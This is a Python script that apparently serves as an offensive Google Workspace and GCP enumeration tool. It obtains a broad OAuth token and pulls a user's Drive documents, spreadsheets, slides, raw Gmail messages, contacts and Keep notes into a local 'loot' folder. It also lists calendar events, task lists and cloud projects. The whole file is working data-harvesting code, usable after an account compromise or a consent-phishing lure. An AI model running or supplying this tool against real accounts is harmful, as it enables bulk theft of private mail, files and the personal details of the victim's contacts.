from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich import box
from rich.table import Table
import os
import json
import base64
import datetime
import requests
from pathlib import Path
from google.oauth2.credentials import Credentials
from google_auth_oauthlib.flow import InstalledAppFlow
from googleapiclient.discovery import build

console = Console()
now = datetime.datetime.now().isoformat()

# Create loot directory structure
loot_base = Path("loot")
loot_drive = loot_base / "drive"
loot_gsheet = loot_base / "gsheet"
loot_gmail = loot_base / "gmail"
loot_contacts = loot_base / "contacts"
loot_keep = loot_base / "keep"

for path in [loot_base, loot_drive, loot_gsheet, loot_gmail, loot_contacts, loot_keep]:
    path.mkdir(parents=True, exist_ok=True)

SCOPES = [
    'openid',
    'https://www.googleapis.com/auth/userinfo.email',
    'https://www.googleapis.com/auth/gmail.readonly',
    'https://www.googleapis.com/auth/drive.readonly',
    'https://www.googleapis.com/auth/contacts.readonly',
    'https://www.googleapis.com/auth/calendar.readonly',
    'https://www.googleapis.com/auth/tasks.readonly',
    'https://www.googleapis.com/auth/spreadsheets.readonly',
    'https://www.googleapis.com/auth/presentations.readonly',
    'https://www.googleapis.com/auth/documents.readonly',
    'https://www.googleapis.com/auth/cloud-platform.read-only',
    'https://www.googleapis.com/auth/cloud-platform',
]

console.print(Panel(f"[bold green]📦 GWS + GCP Enumeration Started[/] @ [cyan]{now}[/]", box=box.DOUBLE))

flow = InstalledAppFlow.from_client_secrets_file('client_secrets.json', SCOPES)
flow.oauth2session._state = None
creds = flow.run_local_server(port=0, include_client_id=True)

authed_session = requests.Session()
authed_session.headers.update({'Authorization': f'Bearer {creds.token}'})

# User Info
userinfo = authed_session.get("https://www.googleapis.com/oauth2/v1/userinfo").json()
email = userinfo.get("email", "unknown")
console.print(f"[green][+][/green] Logged in as: [bold yellow]{email}[/bold yellow]")

# Google Drive
console.print("\n[bold cyan]📁 Checking Google Drive...[/]")
drive = build('drive', 'v3', credentials=creds)
results = drive.files().list(fields="files(id, name, mimeType)").execute().get('files', [])
docs, sheets, slides = [], [], []

for file in results:
    if file['mimeType'] == 'application/vnd.google-apps.document':
        docs.append(file)
    elif file['mimeType'] == 'application/vnd.google-apps.spreadsheet':
        sheets.append(file)
    elif file['mimeType'] == 'application/vnd.google-apps.presentation':
        slides.append(file)

def print_items(title, items, ext, path, export_url_fn):
    if items:
        console.print(f"[green][+][/green] Found [bold]{title}[/bold]:")
        for f in items:
            console.print(f"    • [bold yellow]{f['name']}[/bold yellow] ([cyan]{f['id']}[/cyan])")
            url, mime = export_url_fn(f)
            res = authed_session.get(url, params=mime)
            if res.status_code == 200:
                fpath = path / f"{f['name'].replace('/', '_')}.{ext}"
                fpath.write_bytes(res.content)
            else:
                console.print(f"    [red][!][/red] Failed to download [yellow]{f['name']}[/yellow]: {res.status_code}")
    else:
        console.print(f"[red][-][/red] No {title} found.")

print_items("Google Docs", docs, "docx", loot_drive, lambda f: (f"https://www.googleapis.com/drive/v3/files/{f['id']}/export", {"mimeType": "application/vnd.openxmlformats-officedocument.wordprocessingml.document"}))
print_items("Google Sheets", sheets, "csv", loot_gsheet, lambda f: (f"https://docs.google.com/spreadsheets/d/{f['id']}/export?format=csv", {}))
print_items("Google Slides", slides, "pdf", loot_drive, lambda f: (f"https://www.googleapis.com/drive/v3/files/{f['id']}/export", {"mimeType": "application/pdf"}))

# Gmail
console.print("\n[bold cyan]📧 Checking Gmail...[/]")
gmail = build('gmail', 'v1', credentials=creds)
try:
    labels = gmail.users().labels().list(userId='me').execute().get('labels', [])
    if labels:
        table = Table(title="Gmail Labels", box=box.ROUNDED)
        table.add_column("Label Name", style="cyan")
        for label in labels:
            table.add_row(label['name'])
        console.print(table)

    messages = gmail.users().messages().list(userId='me', maxResults=5).execute().get('messages', [])
    with open(loot_gmail / "snippets.txt", "w") as snippet_file:
        for i, msg in enumerate(messages):
            full_msg = gmail.users().messages().get(userId='me', id=msg['id'], format='full').execute()
            snippet = full_msg.get('snippet', '')
            snippet_file.write(snippet + "\n\n")
            raw_msg = gmail.users().messages().get(userId='me', id=msg['id'], format='raw').execute()
            msg_bytes = base64.urlsafe_b64decode(raw_msg['raw'])
            (loot_gmail / f"email_{i+1}.eml").write_bytes(msg_bytes)

except Exception as e:
    console.print(f"[red][!][/red] Gmail error: {e}")

# Contacts
console.print("\n[bold cyan]📇 Checking Google Contacts...[/]")
try:
    contacts_res = authed_session.get("https://people.googleapis.com/v1/people/me/connections?pageSize=1000&personFields=names,emailAddresses")
    connections = contacts_res.json().get("connections", [])
    if connections:
        with open(loot_contacts / "user-emails.txt", "w") as ef, open(loot_contacts / "user-names.txt", "w") as nf:
            for c in connections:
                name = c.get("names", [{}])[0].get("displayName", "Unknown")
                email = c.get("emailAddresses", [{}])[0].get("value", "None")
                console.print(f"    • [bold yellow]{name}[/bold yellow] ([green]{email}[/green])")
                ef.write(email + "\n")
                nf.write(name + "\n")
    else:
        console.print("[red][-][/red] No contacts found.")
except Exception as e:
    console.print(f"[red][!][/red] Contacts error: {e}")

# Calendar
console.print("\n[bold cyan]📅 Checking Google Calendar...[/]")
calendar = build('calendar', 'v3', credentials=creds)
events = calendar.events().list(calendarId='primary', maxResults=10).execute().get('items', [])
if events:
    for event in events:
        start = event['start'].get('dateTime', event['start'].get('date'))
        console.print(f"    • [bold]{event['summary']}[/bold] at [cyan]{start}[/cyan]")
else:
    console.print("[red][-][/red] No events found.")

# Tasks
console.print("\n[bold cyan]📋 Checking Google Tasks...[/]")
tasks_service = build('tasks', 'v1', credentials=creds)
try:
    task_lists = tasks_service.tasklists().list().execute().get('items', [])
    for tl in task_lists:
        console.print(f"    • Task List: [yellow]{tl['title']}[/yellow]")
except Exception as e:
    console.print(f"[red][!][/red] Tasks error: {e}")

# Google Keep
console.print("\n[bold cyan]📝 Checking Google Keep...[/]")
res = authed_session.get("https://keep.googleapis.com/v1/notes")
if res.status_code == 200:
    console.print(f"[green][+][/green] Notes found and saved.")
    (loot_keep / "notes.json").write_text(json.dumps(res.json(), indent=2))
else:
    console.print(f"[red][!][/red] Keep API error: {res.status_code} - {res.text}")

# GCP Projects
console.print("\n[bold cyan]☁️ Checking GCP Access...[/]")
cloudres = build("cloudresourcemanager", "v1", credentials=creds)
try:
    projects = cloudres.projects().list().execute().get("projects", [])
    if projects:
        for proj in projects:
            console.print(f"    • Project: [green]{proj['projectId']}[/green] - [yellow]{proj.get('name', '')}[/yellow]")
    else:
        console.print("[red][-][/red] No GCP projects found.")
except Exception as e:
    console.print(f"[red][!][/red] GCP error: {e}")

# Done
console.print(Panel("[bold green]✅ Done![/bold green] All data saved in [bold yellow]./loot/[/bold yellow]", box=box.HEAVY))
